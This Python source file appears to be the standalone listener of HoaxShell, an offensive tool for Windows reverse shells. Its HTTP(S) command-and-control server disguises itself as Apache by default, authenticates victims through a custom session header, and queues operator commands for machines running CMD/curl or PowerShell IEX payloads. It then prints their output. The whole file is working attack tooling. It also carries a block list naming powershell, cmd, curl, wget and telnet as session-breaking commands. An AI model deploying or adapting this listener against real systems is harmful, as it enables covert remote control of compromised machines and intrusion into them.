#!/usr/bin/env python3
#
# Author: Panagiotis Chartas (t3l3machus)
# https://github.com/t3l3machus
#
# A standalone version of HoaxShell's listener, mainly created for integration with RevShells.com
 

from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl, sys, argparse, base64, uuid, re
from os import system, path
from warnings import filterwarnings
from datetime import date, datetime
from IPython.display import display
from threading import Thread, Event
from time import sleep
from subprocess import check_output
from string import ascii_uppercase, ascii_lowercase
from platform import system as get_system_type
from random import randint

filterwarnings("ignore", category = DeprecationWarning)

if get_system_type() == 'Linux':
	import gnureadline as global_readline
else:
	import readline as global_readline


''' Colors '''
MAIN = '\033[38;5;50m'
PLOAD = '\033[38;5;119m'
GREEN = '\033[38;5;47m'
BLUE = '\033[0;38;5;12m'
ORANGE = '\033[0;38;5;214m'
RED = '\033[1;31m'
END = '\033[0m'
BOLD = '\033[1m'


''' MSG Prefixes '''
INFO = f'{MAIN}Info{END}'
WARN = f'{ORANGE}Warning{END}'
IMPORTANT = WARN = f'{ORANGE}Important{END}'
FAILED = f'{RED}Fail{END}'
DEBUG = f'{ORANGE}Debug{END}'

# Enable ansi escape characters
def chill():
	pass

WINDOWS = True if get_system_type() == 'Windows' else False
system('') if WINDOWS else chill()


# -------------- Arguments & Usage -------------- #
parser = argparse.ArgumentParser()

parser.add_argument("-t", "--type", action="store", help = "Type of payload to expect. use --list-payloads [-l] for more info.")
parser.add_argument("-c", "--certfile", action="store", help = "Path to your ssl certificate.")
parser.add_argument("-k", "--keyfile", action="store", help = "Path to the private key for your certificate.")
parser.add_argument("-p", "--port", action="store", help = "Your hoaxshell server port (default: 8080 over http, 443 over https).", type = int)
parser.add_argument("-H", "--Header", action="store", help = "Hoaxshell utilizes a non-standard header to transfer the session id between requests. The header's name is set to \"Authorization\" by default. Use this option to set a custom header name. Warning: Don't forget to change it in the payload as well.")
parser.add_argument("-v", "--server-version", action="store", help = "Provide a value for the \"Server\" response header (default: Apache/2.4.1)")
parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")
parser.add_argument("-l", "--list-payloads", action="store_true", help = "List supported payload types.")

args = parser.parse_args()


def exit_with_msg(msg):
	print(f"[{DEBUG}] {msg}")
	sys.exit(0)
	

if args.list_payloads:
	print('''
Supported values for --type [-t]:

Payload Type      Details
------------      -------
cmd-curl       :  Windows CMD payload that utilizes cURL.
ps-iex         :  PowerShell payload that utilizes IEX.
ps-outfile     :  PowerShell payload that writes on disc.
ps-iex-cm      :  PowerShell IEX payload that works on Constraint Mode.
ps-outfile-cm  :  PowerShell OUTFILE payload that works on Constraint Mode

*By using payloads that work on Constraint Language Mode you sacrifice 
a bit of your shell's output encoding accuracy.

	'''
	)

# Check if payload type was declared.
if not args.type:
	exit_with_msg('Type [-t] is required to start the listener.')

elif args.type not in ['cmd-curl', 'ps-iex', 'ps-outfile', 'ps-iex-cm', 'ps-outfile-cm']:
	exit_with_msg('Unsupported or invalid payload type [-t].')

else:
	payload_type = args.type.lower().strip()
	constraint_mode = True if payload_type in ['cmd-curl', 'ps-iex-cm', 'ps-outfile-cm'] else False
	delimiter = str(uuid.uuid4())[0:8]
	grab_prompt_dir_cmd = f"(echo {delimiter} & cd)" if payload_type in ['cmd-curl'] else "echo `r;pwd"

# Check if port is valid.
if args.port:
	if args.port < 1 or args.port > 65535:
		exit_with_msg('Port number is not valid.')


# Check if both cert and key files were provided
if (args.certfile and not args.keyfile) or (args.keyfile and not args.certfile):
	exit_with_msg('Failed to start over https. Missing key or cert file (check -h for more details).')

ssl_support = True if args.certfile and args.keyfile else False

# -------------- General Functions -------------- #
def print_banner():

	padding = '  '

	H = [[' ', '┐', ' ', '┌'], [' ', '├','╫','┤'], [' ', '┘',' ','└']]
	O =	[[' ', '┌','─','┐'], [' ', '│',' ','│'], [' ', '└','─','┘']]
	A = [[' ', '┌','─','┐'], [' ', '├','─','┤'], [' ', '┴',' ','┴']]
	X = [[' ', '─','┐',' ','┬'], [' ', '┌','┴','┬', '┘'], [' ', '┴',' ','└','─']]
	S = [[' ', '┌','─','┐'], [' ', '└','─','┐'], [' ', '└','─','┘']]
	H = [[' ', '┬',' ','┬'], [' ', '├','─','┤'], [' ', '┴',' ','┴']]
	E = [[' ', '┌','─','┐'], [' ', '├','┤',' '], [' ', '└','─','┘']]
	L = [[' ', '┬',' ',' '], [' ', '│',' ', ' '], [' ', '┴','─','┘']]

	banner = [H,O,A,X,S,H,E,L,L]
	final = []
	print('\r')
	init_color = 36
	txt_color = init_color
	cl = 0

	for charset in range(0, 3):
		for pos in range(0, len(banner)):
			for i in range(0, len(banner[pos][charset])):
				clr = f'\033[38;5;{txt_color}m'
				char = f'{clr}{banner[pos][charset][i]}'
				final.append(char)
				cl += 1
				txt_color = txt_color + 36 if cl <= 3 else txt_color

			cl = 0

			txt_color = init_color
		init_color += 31

		if charset < 2: final.append('\n   ')

	print(f"   {''.join(final)}")
	print(f'{END}{padding}                         by t3l3machus\n')



def is_valid_uuid(value):

    try:
        uuid.UUID(str(value))
        return True

    except ValueError:
        return False



def checkPulse(stop_event):

	while not stop_event.is_set():

		timestamp = int(datetime.now().timestamp())
		tlimit = frequency + 7

		if Hoaxshell.execution_verified and Hoaxshell.prompt_ready:
			if abs(Hoaxshell.last_received - timestamp) > tlimit:
				print(f'\r[{WARN}] Session has been idle for more than {tlimit} seconds. Shell probably died.')
				Hoaxshell.prompt_ready = True
				stop_event.set()

		else:
			Hoaxshell.last_received = timestamp
			
		sleep(5)


# ------------------ Settings ------------------ #
prompt = ""
quiet = True if args.quiet else False
stop_event = Event()
frequency = 0.8

def rst_prompt(force_rst = False, prompt = prompt, prefix = '\r'):

	if Hoaxshell.rst_promt_required or force_rst:
		sys.stdout.write(prefix + prompt + global_readline.get_line_buffer())
		Hoaxshell.rst_promt_required = False



class Session_Defender:

	is_active = True
	windows_dangerous_commands = ["powershell.exe", "powershell", "cmd.exe", "cmd", "curl", "wget", "telnet"]		
	interpreters = ['python', 'python3', 'php', 'ruby', 'irb', 'perl', 'jshell', 'node', 'ghci']

	@staticmethod
	def inspect_command(os, cmd):

		# Check if command includes unclosed single/double quotes or backticks OR id ends with backslash
		if Session_Defender.has_unclosed_quotes_or_backticks(cmd):
			return True

		cmd = cmd.strip().lower()

		# Check for common commands and binaries that start interactive sessions within shells OR prompt the user for input		
		if cmd in (Session_Defender.windows_dangerous_commands + Session_Defender.interpreters):
			return True

		return False


	@staticmethod
	def has_unclosed_quotes_or_backticks(cmd):

		stack = []

		for i, c in enumerate(cmd):
			if c in ["'", '"', "`"]:
				if not stack or stack[-1] != c:
					stack.append(c)
				else:
					stack.pop()
			elif c == "\\" and i < len(cmd) - 1:
				i += 1

		return len(stack) > 0


	@staticmethod
	def ends_with_backslash(cmd):
		return True if cmd.endswith('\\') else False


	@staticmethod
	def print_warning():
		print(f'[{WARN}] Dangerous input detected. This command may break the shell session. If you want to execute it anyway, disable the Session Defender by running "cmdinspector".')
		rst_prompt(prompt = prompt)



# -------------- HoaxShell Server -------------- #
class Hoaxshell(BaseHTTPRequestHandler):

	session_established = False
	rst_promt_required = False
	prompt_ready = False
	command_pool = []
	execution_verified = False
	last_received = ''
	header_id = 'Authorization' if not args.Header else args.Header
	server_version = 'Apache/2.4.1' if not args.server_version else args.server_version
	init_dir = None
	
	
	def cmd_output_interpreter(self, output, constraint_mode = False):
		
		global prompt
		
		try:

			if constraint_mode:
				output = output.decode('utf-8', 'ignore').strip()
				
			else:
				bin_output = output.decode('utf-8').split(' ')
				
				try:
					to_b_numbers = [ int(n) for n in bin_output ]
					b_array = bytearray(to_b_numbers)
					output = b_array.decode('utf-8', 'ignore')
					
				except ValueError:
					output = ''

			
			if payload_type == 'cmd-curl':
								
				tmp = output.rsplit(delimiter, 1)
				output = '\n'.join(tmp[0].split('\n')[1:])
				p = '\n' + tmp[1].strip()
				
				if Hoaxshell.init_dir == None:
					Hoaxshell.init_dir = p
											
				prompt = f"{p}> "
			
			
			elif payload_type in ['ps-iex', 'ps-outfile', 'ps-iex-cm', 'ps-outfile-cm']:
				
				tmp = output.rsplit("Path", 1)
				output = tmp[0]
				junk = True if re.search("Provider     : Microsoft.PowerShell.Core", output) else False
				output = output.rsplit("Drive", 1)[0] if junk else output
				
				if Hoaxshell.init_dir == None:
					p = tmp[-1].strip().rsplit("\n")[-1]
					p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
					Hoaxshell.init_dir = p
											
				if payload_type not in ['ps-outfile', 'ps-outfile-cm']:						
					p = tmp[-1].strip().rsplit("\n")[-1]
					p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
					
				else:
					p = Hoaxshell.init_dir
					
				prompt = f"\nPS {p}> "

		except UnicodeDecodeError:
			print(f'[{WARN}] Decoding data to UTF-8 failed. Printing raw data.')

		if isinstance(output, bytes):
			return str(output)

		else:
			output = output.strip() + '\r' if output.strip() != '' else output.strip()
			return output
	


	def do_GET(self):

		timestamp = int(datetime.now().timestamp())
		Hoaxshell.last_received = timestamp

		if not Hoaxshell.session_established:
			Hoaxshell.header_id = 'Authorization' if not args.Header else args.Header			
			session_id = self.headers.get(Hoaxshell.header_id)
			
			if len(session_id) == 26:
				h = session_id.split('-')
				Hoaxshell.verify = h[0]
				Hoaxshell.get_cmd = h[1]
				Hoaxshell.post_res = h[2]
				Hoaxshell.SESSIONID = session_id
				Hoaxshell.session_established = True
				Hoaxshell.execution_verified = True
				session_check = Thread(target = checkPulse, args = (stop_event,))
				session_check.daemon = True
				session_check.start()

				print(f'\r[{GREEN}Shell{END}] Session established!')

		self.server_version = Hoaxshell.server_version
		self.sys_version = ""
		session_id = self.headers.get(Hoaxshell.header_id)
		legit = True if session_id == Hoaxshell.SESSIONID else False

		# Verify execution
		if self.path == f'/{Hoaxshell.verify}' and legit:

			self.send_response(200)
			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
			self.send_header('Access-Control-Allow-Origin', '*')
			self.end_headers()
			self.wfile.write(bytes('OK', "utf-8"))
			Hoaxshell.execution_verified = True
			session_check = Thread(target = checkPulse, args = (stop_event,))
			session_check.daemon = True
			session_check.start()
			print(f'[{GREEN}Shell{END}] Stabilizing command prompt...\n')
			Hoaxshell.command_pool.append(grab_prompt_dir_cmd)


		# Grab cmd
		elif self.path == f'/{Hoaxshell.get_cmd}' and legit and Hoaxshell.execution_verified:

			self.send_response(200)
			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
			self.send_header('Access-Control-Allow-Origin', '*')
			self.end_headers()

			if len(Hoaxshell.command_pool):
				cmd = Hoaxshell.command_pool.pop(0)
				self.wfile.write(bytes(cmd, "utf-8"))

			else:
				self.wfile.write(bytes('None', "utf-8"))

			Hoaxshell.last_received = timestamp


		else:
			self.send_response(200)
			self.end_headers()
			self.wfile.write(b'Move on mate.')
			pass



	def do_POST(self):
		
		try:
			
			global prompt
			timestamp = int(datetime.now().timestamp())
			Hoaxshell.last_received = timestamp
			self.server_version = Hoaxshell.server_version
			self.sys_version = ""
			session_id = self.headers.get(Hoaxshell.header_id)
			legit = True if session_id == Hoaxshell.SESSIONID else False

			# cmd output
			if self.path == f'/{Hoaxshell.post_res}' and legit and Hoaxshell.execution_verified:

				try:
					self.send_response(200)
					self.send_header('Access-Control-Allow-Origin', '*')
					self.send_header('Content-Type', 'text/plain')
					self.end_headers()
					self.wfile.write(b'OK')
					content_len = int(self.headers.get('Content-Length'))
					output = self.rfile.read(content_len)
					output = Hoaxshell.cmd_output_interpreter(self, output, constraint_mode = constraint_mode)
					
					if output:				
						print(f'\r{GREEN}{output}{END}')
						
						
				except ConnectionResetError:
					print(f'[{FAILED}] There was an error reading the response, most likely because of the size (Content-Length: {self.headers.get("Content-Length")}). Try redirecting the command\'s output to a file and transfering it to your machine.')

				rst_prompt(prompt = prompt)
				Hoaxshell.prompt_ready = True

			else:
				self.send_response(200)
				self.end_headers()
				self.wfile.write(b'Move on mate.')
				pass
				
		except AttributeError:
			print(f'[{INFO}] Received request to output data, most likely from a previously poisoned machine that is still running the payload.')


	def do_OPTIONS(self):

		self.server_version = Hoaxshell.server_version
		self.sys_version = ""
		self.send_response(200)
		self.send_header('Access-Control-Allow-Origin', self.headers["Origin"])
		self.send_header('Vary', "Origin")
		self.send_header('Access-Control-Allow-Credentials', 'true')
		self.send_header('Access-Control-Allow-Headers', Hoaxshell.header_id)
		self.end_headers()
		self.wfile.write(b'OK')


	def log_message(self, format, *args):
		return


	def dropSession():

		print(f'\r[{WARN}] Closing session elegantly...')
		Hoaxshell.command_pool.append('exit')			
		sleep(frequency + 2.0)
		print(f'[{WARN}] Session terminated.')
		stop_event.set()
		sys.exit(0)


	def terminate():

			if Hoaxshell.execution_verified:
				Hoaxshell.dropSession()

			else:
				print(f'\r[{WARN}] Session terminated.')
				stop_event.set()
				sys.exit(0)



def main():

	try:
		chill() if quiet else print_banner()

		# Check provided header name for illegal chars
		if args.Header:
			valid = ascii_uppercase + ascii_lowercase + '-_'
			
			for char in args.Header:
				if char not in valid:
					 exit_with_msg('Header name includes illegal characters.')
		
		
		# Check if http/https
		if ssl_support:
			server_port = int(args.port) if args.port else 443
		else:
			server_port = int(args.port) if args.port else 8080
	
				
		# Start http server
		try:
			httpd = HTTPServer(('0.0.0.0', server_port), Hoaxshell)

		except OSError:
			exit(f'\n[{FAILED}] Port {server_port} seems to already be in use.\n')

		if ssl_support:
			httpd.socket = ssl.wrap_socket (
				httpd.socket,
				keyfile = args.keyfile ,
				certfile = args.certfile ,
				server_side = True,
				ssl_version=ssl.PROTOCOL_TLS
			)


		port = f':{server_port}' if server_port != 443 else ''

		Hoaxshell_server = Thread(target = httpd.serve_forever, args = ())
		Hoaxshell_server.daemon = True
		Hoaxshell_server.start()

		print(f'[{INFO}] Https listener started on port {server_port}.') if ssl_support else print(f'[{INFO}] Http listener started on port {server_port}.')
		print(f'\r[{INFO}] You can\'t change directory with the "ps-outfile" payload type. Your commands must include absolute paths to files, etc.') if payload_type in ['ps-outfile', 'ps-outfile-cm'] else chill()
		print(f'[{IMPORTANT}] Awaiting payload execution to initiate shell session...')

		# Command prompt
		while True:

			if Hoaxshell.prompt_ready:

				user_input = input(prompt).strip()
				user_input_lower = user_input.lower()

				if user_input_lower in ['clear']:
					system('clear')

				elif user_input_lower in ['exit', 'quit', 'q']:
					Hoaxshell.terminate()

				elif user_input == '':
					rst_prompt(force_rst = True, prompt = '\r')

				elif user_input_lower == 'cmdinspector':
					Session_Defender.is_active = not Session_Defender.is_active
					print(f'Session Defender is turned {"off" if not Session_Defender.is_active else "on"}.')

				else:

					if Hoaxshell.execution_verified and not Hoaxshell.command_pool:

						# Invoke Session Defender to inspect the command for dangerous input
						dangerous_input_detected = False

						if Session_Defender.is_active:
							dangerous_input_detected = Session_Defender.inspect_command(None, user_input)

						if dangerous_input_detected:
							Session_Defender.print_warning()
							continue

						if user_input == "pwd" and payload_type not in ['cmd-curl']:
							user_input = "split-path $pwd'\\0x00'"
						
						full_command = f"({user_input} & echo {delimiter} & cd)" if payload_type in ['cmd-curl'] else user_input + ";pwd"
						Hoaxshell.command_pool.append(full_command)
						Hoaxshell.prompt_ready = False

					elif Hoaxshell.execution_verified and Hoaxshell.command_pool:
						pass

			else:
				sleep(0.2)


	except KeyboardInterrupt:
		Hoaxshell.terminate()


main()
